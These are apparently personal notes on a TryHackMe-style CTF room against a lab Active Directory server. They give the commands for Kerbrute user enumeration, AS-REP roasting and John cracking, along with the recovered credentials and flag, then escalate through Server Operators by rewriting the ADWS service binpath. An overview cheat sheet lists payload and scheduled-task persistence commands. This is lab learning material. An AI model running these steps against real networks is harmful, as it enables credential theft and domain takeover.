item.title: Kerbrute
item.description:
#Attacking_machine
kerbrute_linux_amd64 is a compiled Linux binary (for 64-bit systems using the AMD64 architecture) of Kerbrute, a tool used for enumerating valid Active Directory (AD) accounts and performing Kerberos pre-authentication brute-force attacks.


Kerbrute is an open-source tool written in Go by Ronnie Flathers (@ropnop). It interacts with the Kerberos protocol to:

Enumerate usernames against a Kerberos service without triggering account lockouts.

Brute-force passwords for known usernames via Kerberos pre-authentication.

Discover domain configuration, such as the domain controller, realm, etc.

GitHub repo: https://github.com/ropnop/kerbrute


File: kerbrute_linux_amd64

Platform: Linux

Architecture: x86_64 (aka AMD64)

Type: Static binary â€” doesn't need installation, just chmod +x and run.

Usage Example:
./kerbrute_linux_amd64 userenum -d example.com usernames.txt
This would test usernames from usernames.txt against the domain example.com.


#Attacking_machine
Use kerbrute to see whether the users from the previous step are valid or not.
~/tools/kerbrute_linux_amd64 userenum --dc <MACHINE IP> -d services.local users.txt

The four usernames are valid.
Next step: Gaining initial access

item.title: First enumeration
item.description:
#Attacking_machine

#Attacking_machine
Use nmap to see the services and ports on the victim machine.
nmap -A <MACHINE IP>



Hostname: WIN-SERVICES

Domain: services.local

Operating System: Microsoft Windows (likely Server 2019 based on Product Version 10.0.17763)

Role: Most likely an Active Directory Domain Controller






SMB Security:
Signing required â€” prevents relay attacks, which is good.

SMBv2 in use â€” more secure than SMBv1, which is deprecated.

HTTP Server (Port 80):
Supports the TRACE method, which is risky as it can enable Cross Site Tracing (XST).

IIS version disclosed (Microsoft-IIS/10.0), which can help attackers identify exploits.

SSL Certificates:
Valid certificate with CN=WIN-SERVICES.services.local

Not valid before 2025-10-18, expires on 2026-04-19.

RDP Info Leak:
Detailed information about domain, host, and OS version leaked through RDP NTLM handshake (rdp-ntlm-info).






Use nmap to confirm services and do light scripting enumeration.

Basic service scan:
sudo nmap -sS -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389 -sV -oA nmap-services <MACHINE IP> -Pn


Light service scripts for AD/LDAP/RDP info:
sudo nmap -sS -p 88,135,389,445,3389 --script=ldap-search,ldap-rootdse,msrpc-enum,rdp-ntlm-info,smb-protocols -oN nmap-ad-scripts.txt <MACHINE IP>


Your Nmap output confirms that anonymous LDAP queries are partially allowed, and this provided:

defaultNamingContext: DC=services,DC=local

dnsHostName: WIN-SERVICES.services.local

domainFunctionality, forestFunctionality, etc. â†’ all level 7 (Windows Server 2016+)

Domain Controller is WIN-SERVICES, and it's ready for Global Catalog queries.
Try LDAP user/SPN enumeration. Use this:
ldapsearch -x -H ldap://<MACHINE IP> -b "DC=services,DC=local" "(objectClass=user)" sAMAccountName | tee ldap-users.txt

Anonymous LDAP access is not allowed for that query â€” you must bind with valid credentials to enumerate objects like users or SPNs.
Nest step: Web Server

item.title: Gaining initial access
item.description:
#Attacking_Machine #Attacking_machine

AS-REP Roasting is the technique that enables the attacker to retrieve password hashes for AD users whose account options have been set to "Do not require Kerberos pre-authentication". This option relies on the old Kerberos authentication protocol, which allows authentication without a password. Once we obtain the hashes, we can try to crack it offline, and finally, if it is crackable, we got a password!

#Attacking_Machine
Export AS-REP entries in John format.
/usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip <MACHINE IP> services.local/ -usersfile users.txt -request -format john -outputfile asreps.john
-request tells the script to request the TGTs.
-format john outputs the hashes in John The Ripper format .
-outputfile writes them to asreps.john.

You'll get a hash.

#Attacking_machine

Copy the hash to a file called hash.txt.
echo "$krb5asrep$j.rock@SERVICES.LOCAL:d3806d33a6a4b744bfa1443aad9136e1$ " > hash.txt

Run this command to crack the hash with John the Ripper.
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Credentials:
j.rock@SERVICES.LOCAL:Serviceworks1
Next step: Connecting the Machine

item.title: Administrator flag
item.description:
#evil-winrm
#evil-winrm

Go to C:\Users\Administrator\Desktop.
Modify root.txt file permissions using the legacy Windows utility cacls, which is used to view and edit access control lists (ACLs) on files.
cacls root.txt /e /p j.rock:f

cacls: Displays or modifies access control lists (ACLs) for files.

root.txt: The target file whose permissions are being changed.

/e: Edit mode â€” modifies existing ACLs rather than replacing them.

/p j.rock:f: Grants Full Control (f) permission to the user j.rock.

This command grants full access to the file root.txt for the user j.rock, without removing existing permissions for other users. Full access includes:

Read
Write
Modify
Delete

Read the root.txt file.
What is the administrator flag? THM{S3rv3r_0p3rat0rS}

item.title: Services
item.description:
#evil-winrm #evil-winrm
Once you have connected the machine you can look for the user's (j.rock) services.
#evil-winrm
whoami /all


On Windows, the â€œServer Operatorsâ€ group is a built-in local group that exists on Windows Server editions (not usually on Windows 10/11).


Built-in group on Windows Server.

Members can perform administrative tasks on the server without being full Administrators.

Common privileges:
Start/stop system services

Manage shared resources (create/delete network shares)

Back up and restore files

Log on locally to the server

Shut down the system

ðŸ§  They canâ€™t change security settings or install software that affects all users â€” those actions require full Administrators.

#evil-winrm
Enumerate the services with the command services.
services
Use the ADWS Service.


Add the user j.rock to the local Administrators group.
sc.exe config adws binpath="net localgroup administrators j.rock /add"
sc.exe config: Modifies the configuration of an existing Windows service.
adws: Refers to the Active Directory Web Services â€” a legitimate Windows service.
binpath=: Specifies the executable path that the service will run when started.
"net localgroup administrators j.rock /add": A command that adds the user j.rock to the local Administrators group.

Stop the ADWS Service.
sc.exe stop adws


Start the ADWS Service.
sc.exe start adws


Exit the shell and log in again.

Now you should be in the administrators group.
Next step: Administrator flag

item.title: Overview
item.description:
The room walks through common network services youâ€™ll encounter on servers and in CTFs (SMB, FTP, Telnet, sometimes NFS and other service misconfigurations). It focuses on enumeration â†’ identifying misconfigurations or exposed shares/services â†’ exploiting simple service-level issues to find flags or pivot. The content mixes conceptual explanations with hands-on tasks and Nmap/enum examples.

Find and abuse exposed network services and Kerberos/AD weaknesses to gain access and escalate, using enumeration â†’ credential harvesting â†’ exploitation â†’ post-exploit abuse of privileges (e.g., Server Operators). TryHackMe+1


Recon & port scan â€” discover services (SMB, Kerberos/88, LDAP/389, RDP, FTP, Telnet). Use that to prioritise further enumeration. Source Code+1
Service enumeration â€” enumerate SMB shares, anonymous FTP, service banners; collect any creds/configs in readable files. Tools: enum4linux, smbclient, nmap scripts. TryHackMe+1
Kerberos attacks & user enumeration â€” use kerbrute to test usernames/passwords or discover valid principals; use Impacketâ€™s GetNPUsers.py to pull AS-REP hashes from accounts without preauth. These provide offline cracking or further access. hackernfo.com
Exploit / initial access â€” use valid creds or cracked AS-REP passwords with services (SMB, RDP, WinRM). Metasploit may provide modules/exploits for vulnerable services found. InfoSec Write-ups
Post-exploit / foothold â€” Evil-WinRM or a Meterpreter shell gives interactive access; enumerate groups, privileges, services, scheduled tasks, and accessible shares.
Abuse Server Operators / service permissions â€” if the account is in Server Operators or has service-related privileges, manage services, create shares, schedule tasks, or use backup/restore to access sensitive files or escalate. ronamosa.io
Lateral movement / domain escalation â€” use harvested creds, delegation misconfigurations, writable service binaries or weak DACLs to move to other hosts or escalate to domain accounts. denizhalil.com


kerbrute â€” fast username enumeration / password spraying for Kerberos/SMB; finds valid accounts to target.
Example: kerbrute userenum -d DOMAIN -u users.txt --dc-ip 10.10.XX.XX

GetNPUsers.py (Impacket) â€” pull AS-REP (no-preauth) responses for offline cracking: python3 GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 10.10.XX.XX -format hashcat Then crack with hashcat/john (example hashcat mode depends on format). denizhalil.com

Metasploit â€” useful when a service has a known exploit; otherwise use as a framework for payloads/auxiliary modules. Example: run an SMB/RPC module if nmap shows vulnerable service. InfoSec Write-ups

Evil-WinRM â€” post-exploit interactive Windows shell when you have creds: evil-winrm -i 10.10.XX.XX -u user -p 'password'

Server Operators group â€” once membership is confirmed (via whoami /groups, net localgroup "Server Operators"), check what you can do: manage services, shares, scheduled tasks, backups. These allow privilege actions on the host without full admin. ronamosa.io


# identity & privileges whoami whoami /groups whoami /priv # list local groups & members net localgroup net localgroup "Server Operators" # services (what you may be able to manage) sc query state= all sc queryex <ServiceName> sc config <ServiceName> binPath= "C:\temp\payload.exe" # if permitted sc start <ServiceName> sc stop <ServiceName> # scheduled tasks (persistence/exec) schtasks /query /fo LIST /v schtasks /create /sc once /tn "pwn" /tr "C:\temp\pwn.ps1" /st 23:59 # shares & files net share dir C:\Users\Public\ /s /b type C:\path\to\interesting.txt


Extract AS-REP hashes with GetNPUsers.py.
Crack offline:
# example (adjust mode to AS-REP / RC4 / AES type) hashcat -m 18200 asrep.txt rockyou.txt

Use cracked password with evil-winrm, smbclient, or RDP. You can also craft tickets with Rubeus if needed. denizhalil.com


Accounts that do not require preauth (AS-REP roastable). denizhalil.com

Readable config/backup files on SMB shares containing creds. Source Code

Membership in Server Operators or other groups that allow service/share/task management. ronamosa.io

Writable service binary path or weak DACLs on services/scheduled tasks â€” immediate escalation vector. denizhalil.com



Nmap â†’ find ports 88 (Kerberos), 445 (SMB). Source Code
kerbrute finds valid user svc_backup.
GetNPUsers.py returns AS-REP for svc_backup â†’ crack â†’ get password. denizhalil.com
evil-winrm to host with svc_backup â†’ whoami /groups shows Server Operators.
Use sc config or create scheduled task to run payload or copy C:\Windows\System32\cmd.exe substitute â†’ escalate or extract files.
